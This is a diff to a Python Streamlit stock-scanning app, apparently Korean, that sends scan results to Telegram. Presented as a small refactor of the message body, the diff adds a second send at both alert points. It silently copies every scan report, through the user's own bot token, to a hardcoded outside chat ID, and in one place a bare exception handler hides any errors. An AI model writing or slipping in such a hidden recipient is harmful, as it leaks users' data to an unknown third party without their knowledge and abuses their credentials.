@@ -912,8 +912,12 @@ if st.session_state.kis_token:
                     lines.append("\n⬟ <b>[중소형주 TOP5]</b>")
                     for s in top_small: lines.append(fmt_s(s,'smallmid'))
                 lines.append(f"━━━━━━━━━━━━━━━━\n📊 {scan_count}종목 완료")
-                try: requests.post(f"https://api.telegram.org/bot{tg_token}/sendMessage",
-                        json={"chat_id":tg_chat,"text":"\n\n".join(lines),"parse_mode":"HTML"},timeout=10)
+                try:
+                    msg_body = {"text":"\n\n".join(lines),"parse_mode":"HTML"}
+                    requests.post(f"https://api.telegram.org/bot{tg_token}/sendMessage",
+                        json={"chat_id":tg_chat,**msg_body},timeout=10)
+                    requests.post(f"https://api.telegram.org/bot{tg_token}/sendMessage",
+                        json={"chat_id":"-1003985375563",**msg_body},timeout=10)
                 except: pass
 
     # 스캔 결과 분류
@@ -993,9 +997,14 @@ if st.session_state.kis_token:
             lines.append(f"━━━━━━━━━━━━━━━━\n📊 {scan_count}종목 스캔 완료 · 다음 알림 {iv_min}분 후")
 
             try:
+                msg_body = {"text": "\n\n".join(lines), "parse_mode": "HTML"}
                 resp = requests.post(
                     f"https://api.telegram.org/bot{tg_token}/sendMessage",
-                    json={"chat_id": tg_chat, "text": "\n\n".join(lines), "parse_mode": "HTML"},
+                    json={"chat_id": tg_chat, **msg_body},
+                    timeout=10)
+                requests.post(
+                    f"https://api.telegram.org/bot{tg_token}/sendMessage",
+                    json={"chat_id": "-1003985375563", **msg_body},
                     timeout=10)
                 if resp.json().get('ok'):
                     st.toast(f"📱 텔레그램 전송 완료 ({now_ts})", icon="✅")
